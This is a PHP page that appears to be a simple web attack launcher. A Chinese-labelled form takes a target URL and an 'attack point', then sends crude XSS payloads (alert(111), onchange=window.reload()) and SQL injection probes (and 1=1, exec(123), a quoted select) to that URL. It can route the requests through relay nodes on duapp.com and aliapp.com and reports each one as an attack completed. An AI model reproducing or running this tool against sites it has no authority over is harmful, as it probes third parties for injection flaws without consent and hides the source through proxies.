<?php

	if(isset($_POST['url'])){
		$url = $_POST['url'];
		$location = $_POST['location'];

		$nodeUrl = array(
			0 => '',
			1 => 'http://1.jelope.duapp.com/agent.php?url=',
			2 => 'http://ibookbook.aliapp.com/agent.php?url='
		);

		function httpHeader($url){

			$curl = curl_init();
			$timeOut = 30;
			$userAgent = 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 GTB5';

			curl_setopt($curl, CURLOPT_URL, $url);
			curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
			curl_setopt($curl, CURLOPT_USERAGENT, $userAgent);
			curl_setopt($curl, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);

			$a = curl_exec($curl);

			// $curlinfo = curl_getinfo($curl);
			// print_r($curlinfo);
			// var_dump($a);
		}


		function xss1($url, $node = 0){
			global $nodeUrl;
			$url = "{$nodeUrl[$node]}{$url}";
			$url = "{$url}?a=alert(111)";
			httpHeader($url);
			echo "alert(111) 攻击完成<br/>";
		}

		function xss2($url, $node = 0){
			global $nodeUrl;
			$url = "{$nodeUrl[$node]}{$url}";
			$url = "{$url}?a=onchange=window.reload()";
			httpHeader($url);
			echo "onchange=window.reload() 攻击完成<br/>";
		}

		function xss3($url, $node = 0){
			global $nodeUrl;
			$url = "{$nodeUrl[$node]}{$url}";
			$url = "{$url}?a=<a></a>";
			httpHeader($url);
			$a = htmlspecialchars('<a></a>');
			echo "{$a} 攻击完成<br/>";
		}

		function sql1($url, $node = 0){
			global $nodeUrl;
			$url = "{$nodeUrl[$node]}{$url}";
			$url = "{$url}/?id=1%20and%201=1";
			httpHeader($url);
			echo "and 1=1 攻击完成<br/>";
		}

		function sql2($url, $node = 0){
			global $nodeUrl;
			$url = "{$nodeUrl[$node]}{$url}";
			$url = "{$url}/?id=exec(123)";
			httpHeader($url);
			echo "exec(123) 攻击完成<br/>";
		}

		function sql3($url, $node = 0){
			global $nodeUrl;
			$url = "{$nodeUrl[$node]}{$url}";
			$url = "{$url}/?a=1'%20and%20select%20*%20from%201";
			httpHeader($url);
			echo "' and select * from 1 攻击完成<br/>";
		}

		switch ($_POST['mode']) {
			case 'XSS攻击1':
				xss1($url, $location);
				break;

			case 'XSS攻击2':
				xss2($url, $location);
				break;

			case 'XSS攻击3':
				xss3($url, $location);
				break;

			case '注入攻击1':
				sql1($url, $location);
				break;

			case '注入攻击2':
				sql2($url, $location);
				break;

			case '注入攻击3':
				sql3($url, $location);
				break;
			
			case '全部攻击':
				xss1($url, $location);
				xss2($url, $location);
				xss3($url, $location);
				sql1($url, $location);
				sql2($url, $location);
				sql3($url, $location);
				break;

			default:
				# code...
				break;
		}


	}


?>

<form action="" method="POST">
	攻击网址：<input type="text" style="width:600px;" name="url" value="<?php if(isset($url)) echo $url; ?>"/>
	<hr />
	攻击点:
	<select name="location">
		<option value="0" <?php if($location == 0) echo 'selected'; ?> >本地</option>
		<option value="1" <?php if($location == 1) echo 'selected'; ?>>北京</option>
		<option value="2" <?php if($location == 2) echo 'selected'; ?>>杭州</option>
	</select>
	<hr />
	<input type="submit" value="XSS攻击1" name="mode"/>
	<input type="submit" value="XSS攻击2" name="mode"/>
	<input type="submit" value="XSS攻击3" name="mode"/>
	<input type="submit" value="注入攻击1" name="mode"/>
	<input type="submit" value="注入攻击2" name="mode"/>
	<input type="submit" value="注入攻击3" name="mode"/>
	<input type="submit" value="全部攻击" name="mode"/>
</form>